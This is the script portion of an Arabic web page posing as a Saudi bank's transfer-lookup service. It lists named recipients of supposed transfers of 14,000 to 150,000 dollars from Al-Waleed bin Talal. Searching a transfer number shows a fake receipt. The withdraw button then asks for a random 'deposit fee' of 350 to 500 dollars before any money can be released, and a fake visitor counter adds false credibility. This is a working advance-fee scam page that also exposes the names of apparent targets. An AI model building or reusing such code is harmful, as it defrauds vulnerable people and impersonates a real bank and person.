        @media (max-width: 850px) {

        }    <script>
        (function() {
            // ---------- المستفيدين مع المبالغ المخصصة ----------
            const beneficiaries = [
                { name: "احمد محمد حسان احمد", amount: 14000 },
                { name: "هواري خالد عبدالقادر بوجناح", amount: 14000 },
                { name: "احمد مهيوب محمد غالب", amount: 14000 },
                { name: "عبدالمجيد علي ناصر العلاني", amount: 14000 },
                { name: "ناصر محسن الحاجي", amount: 14000 },
                { name: "خليفي محمد الطيب", amount: 14000 },
                { name: "حسام الدين فتحي شاكر محمود", amount: 14000 },
                { name: "العربي غريب يوسف محمد القزاز", amount: 21333 },
                { name: "محمود محمد علوى الحضرى", amount: 14000 },
                { name: "منير أحمد الخلف", amount: 150000 },
                { name: "بهيه حسين شريف", amount: 150000 },
                { name: "راوية حسن محمد بابكر", amount: 150000 },
                { name: "امل ياسين الحسن", amount: 150000 },
                { name: "انتصار محمود محاميد", amount: 150000 },
                { name: "مها رياض حلاق", amount: 100000 },
                { name: "خليل عسي خضر", amount: 50000 },
                { name: "عبدالفتاح السيد البرادعي", amount: 50000 }
            ];

            // ---------- إنشاء الحوالات بأرقام تبدأ من 1155405 ----------
            const transfers = [];
            const senderName = "الوليد بن طلال آل سعود";
            const startNumber = 1155405;

            beneficiaries.forEach((item, index) => {
                const number = String(startNumber + index);
                transfers.push({
                    number: number,
                    sender: senderName,
                    receiver: item.name,
                    amount: item.amount,
                    date: new Date().toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' })
                });
            });

            // DOM refs
            const searchInput = document.getElementById('searchInput');
            const searchBtn = document.getElementById('searchBtn');
            const resultArea = document.getElementById('resultArea');
            const receiptBody = document.getElementById('receiptBody');
            const withdrawBtn = document.getElementById('withdrawBtn');
            const withdrawMsg = document.getElementById('withdrawMessage');
            const withdrawFields = document.getElementById('withdrawFields');
            const confirmWithdrawBtn = document.getElementById('confirmWithdrawBtn');
            const countrySelect = document.getElementById('countrySelect');
            const countryNote = document.getElementById('countryNote');
            const withdrawCode = document.getElementById('withdrawCode');

            // Visitor counter
            const visitorEl = document.getElementById('visitorCount');
            let currentVisitors = parseInt(visitorEl.textContent.replace(/,/g, '')) || 1284;
            currentVisitors += Math.floor(Math.random() * 7) + 1;
            visitorEl.textContent = currentVisitors.toLocaleString();

            // Clock
            function updateClock() {
                const now = new Date();
                const timeStr = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
                document.getElementById('currentTime').textContent = timeStr;
            }
            updateClock();
            setInterval(updateClock, 30000);

            // ---------- Search Function (supports 7-10 digits) ----------
            function performSearch(query) {
                const trimmed = query.trim();
                if (!trimmed) {
                    alert('الرجاء إدخال رقم الحوالة');
                    return;
                }
                // Allow 7-10 digits
                if (!/^\d{7,10}$/.test(trimmed)) {
                    alert('⚠️ رقم الحوالة يجب أن يكون بين 7 و 10 أرقام.');
                    return;
                }

                const found = transfers.find(t => t.number === trimmed);
                if (!found) {
                    alert('⚠️ لم يتم العثور على حوالة بهذا الرقم. تأكد من الرقم.');
                    resultArea.classList.remove('show');
                    return;
                }

                receiptBody.innerHTML = `
                    <div class="receipt-row"><span>رقم الحوالة</span><span>${found.number}</span></div>
                    <div class="receipt-row"><span>المرسل</span><span>${found.sender}</span></div>
                    <div class="receipt-row"><span>المستلم</span><span>${found.receiver}</span></div>
                    <div class="receipt-row"><span>المبلغ</span><span>$${found.amount.toLocaleString()}</span></div>
                    <div class="receipt-row"><span>التاريخ</span><span>${found.date}</span></div>
                `;
                resultArea.classList.add('show');
                resultArea.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            }

            // Search events
            searchBtn.addEventListener('click', function() {
                performSearch(searchInput.value);
            });

            searchInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    performSearch(this.value);
                }
            });

            // ---------- Withdraw Button ----------
            withdrawBtn.addEventListener('click', function() {
                const fee = Math.floor(350 + Math.random() * 151);
                withdrawMsg.style.display = 'block';
                withdrawMsg.innerHTML = `<i class="fas fa-exclamation-triangle"></i> رسوم السحب: $${fee} — لا يمكن سحب المبلغ حالياً إلا بعد سداد رسوم الإيداع`;
                withdrawMsg.style.animation = 'none';
                setTimeout(() => withdrawMsg.style.animation = 'fadeSlide 0.3s ease', 10);

                // Show fields
                withdrawFields.classList.toggle('show');
            });

            // ---------- Country Select ----------
            countrySelect.addEventListener('change', function() {
                if (this.value && this.value !== "المملكة العربية السعودية") {
                    countryNote.classList.add('show');
                } else {
                    countryNote.classList.remove('show');
                }
            });

            // ---------- Confirm Withdraw ----------
            confirmWithdrawBtn.addEventListener('click', function() {
                const country = countrySelect.value;
                const bank = document.getElementById('bankSelect').value;
                const code = withdrawCode.value.trim();

                if (!country) {
                    alert('⚠️ الرجاء اختيار الدولة.');
                    return;
                }
                if (!bank) {
                    alert('⚠️ الرجاء اختيار المصرف أو شركة الصرافة.');
                    return;
                }
                if (!code || code.length !== 6) {
                    alert('⚠️ الرجاء إدخال كود السحب المكون من 6 أرقام.');
                    return;
                }

                let message = `✅ تم تأكيد طلب السحب بنجاح!\n`;
                message += `📌 الدولة: ${country}\n`;
                message += `🏦 المصرف: ${bank}\n`;
                message += `🔑 كود السحب: ${code}\n`;

                if (country !== "المملكة العربية السعودية") {
                    message += `\n⚠️ ملاحظة: تم تطبيق رسوم إضافية للمستفيدين خارج المملكة.`;
                }

                alert(message);
                withdrawFields.classList.remove('show');
                withdrawMsg.style.display = 'none';
            });

            // Console log for debugging
            console.log('✅ البنك السعودي الاستثماري الدولي - تم التحديث');
            console.log('📋 أرقام الحوالات:', transfers.map(t => t.number).join(', '));

            window.__transfers = transfers;

        })();
    </script>

</body>
